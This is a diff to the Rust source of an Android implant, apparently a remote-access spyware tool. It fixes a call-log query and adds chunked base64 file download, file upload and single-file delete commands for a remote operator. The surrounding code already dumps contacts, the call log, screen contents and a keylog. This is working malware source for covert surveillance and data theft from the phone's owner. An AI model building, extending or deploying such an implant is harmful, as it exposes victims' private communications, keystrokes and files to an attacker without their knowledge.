@@ -55,7 +55,10 @@ fn cmd_contacts() -> String {
 fn cmd_calllog() -> String {
     android_bridge::query_provider(
         "content://call_log/calls".into(),
-        "number,date,type,duration,cached_name".into(),
+        // cached_name was removed for non-default-dialer apps in Android 10+ and the
+// ColorOS provider rejects the whole projection over it ("Invalid column
+// cached_name"); the contact name is already reachable via the number.
+        "number,date,type,duration".into(),
         1000,
     )
 }
@@ -81,6 +84,89 @@ fn cmd_perms() -> String {
 
 fn cmd_screen() -> String {
     android_bridge::a11y_dump_screen()
+}
+
+/// Chunked binary read: {"size","offset","len","eof","b64"}.
+fn cmd_fs_read_b64(path: &str, offset: u64, len: u64) -> String {
+    use base64::Engine;
+    use std::io::{Read, Seek, SeekFrom};
+
+    let meta = match std::fs::metadata(path) {
+        Ok(m) => m,
+        Err(e) => return format!("fs error: {}", e),
+    };
+    if !meta.is_file() {
+        return "fs error: not a file".into();
+    }
+    let size = meta.len();
+    let take = len.min(size.saturating_sub(offset)) as usize;
+    let mut buf = Vec::with_capacity(take);
+    if take > 0 {
+        let mut f = match std::fs::File::open(path) {
+            Ok(f) => f,
+            Err(e) => return format!("fs error: {}", e),
+        };
+        if let Err(e) = f.seek(SeekFrom::Start(offset)) {
+            return format!("fs error: {}", e);
+        }
+        // read_exact would fail on a file truncated mid-transfer, so accept a
+        // short read and let eof tell the operator what actually arrived.
+        let mut tmp = vec![0u8; take];
+        match f.read(&mut tmp) {
+            Ok(n) => tmp.truncate(n),
+            Err(e) => return format!("fs error: {}", e),
+        }
+        buf = tmp;
+    }
+    let b64 = base64::engine::general_purpose::STANDARD.encode(&buf);
+    let eof = offset + buf.len() as u64 >= size;
+    match serde_json::to_string(&serde_json::json!({
+        "size": size, "offset": offset, "len": buf.len(), "eof": eof, "b64": b64,
+    })) {
+        Ok(j) => j,
+        Err(e) => format!("json error: {}", e),
+    }
+}
+
+/// Write base64 bytes to the device, appending for all but the first chunk.
+fn cmd_fs_write_b64(path: &str, b64: &str, append: bool) -> String {
+    use base64::Engine;
+    use std::io::Write;
+
+    let bytes = match base64::engine::general_purpose::STANDARD.decode(b64) {
+        Ok(b) => b,
+        Err(e) => return format!("b64 decode error: {}", e),
+    };
+    if let Some(parent) = std::path::Path::new(path).parent() {
+        if !parent.as_os_str().is_empty() {
+            let _ = std::fs::create_dir_all(parent);
+        }
+    }
+    let wrote = match std::fs::OpenOptions::new()
+        .write(true)
+        .create(true)
+        .append(append)
+        .truncate(!append)
+        .open(path)
+    {
+        // append(true) always writes at EOF, so no explicit seek is needed here.
+        Ok(mut f) => match f.write_all(&bytes).map(|_| bytes.len()) {
+            Ok(n) => n,
+            Err(e) => return format!("fs error: {}", e),
+        },
+        Err(e) => return format!("fs error: {}", e),
+    };
+    let total = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
+    format!("wrote {} bytes to {} (total {})", wrote, path, total)
+}
+
+/// Remove one file. No globbing, no recursion: this runs with the implant's own
+/// privileges, so a recursive delete here would be a self-inflicted outage.
+fn cmd_fs_delete(path: &str) -> String {
+    match std::fs::remove_file(path) {
+        Ok(_) => "deleted".into(),
+        Err(e) => format!("fs error: {}", e),
+    }
 }
 
 fn cmd_keylog_file() -> String {
@@ -159,6 +245,28 @@ fn execute_command(cmd: &str, payload: &serde_json::Value) -> Option<String> {
                 .unwrap_or("");
             if path.is_empty() { return Some("usage: cat <path>".into()); }
             Some(cmd_fs_read(path))
+        }
+        // Binary-safe transfer. fs_read stays text-only (cmd_keylog_file depends on
+        // its raw return), so downloads use a chunked base64 read and uploads a
+        // base64 write. Chunking keeps every RPC under the Worker body limit.
+        "fs_read_b64" => {
+            let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            if path.is_empty() { return Some("usage: fs_read_b64 {path, offset?, len?}".into()); }
+            let offset = payload.get("offset").and_then(|v| v.as_u64()).unwrap_or(0);
+            let len = payload.get("len").and_then(|v| v.as_u64()).unwrap_or(262_144);
+            Some(cmd_fs_read_b64(path, offset, len))
+        }
+        "fs_write_b64" => {
+            let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            let b64 = payload.get("b64").and_then(|v| v.as_str()).unwrap_or("");
+            if path.is_empty() { return Some("usage: fs_write_b64 {path, b64, append?}".into()); }
+            let append = payload.get("append").and_then(|v| v.as_bool()).unwrap_or(false);
+            Some(cmd_fs_write_b64(path, b64, append))
+        }
+        "fs_delete" => {
+            let path = payload.get("path").and_then(|v| v.as_str()).unwrap_or("");
+            if path.is_empty() { return Some("usage: fs_delete {path}".into()); }
+            Some(cmd_fs_delete(path))
         }
         "device_info" | "info" => Some(cmd_device_info()),
         "ping" | "heartbeat" => Some("pong".into()),
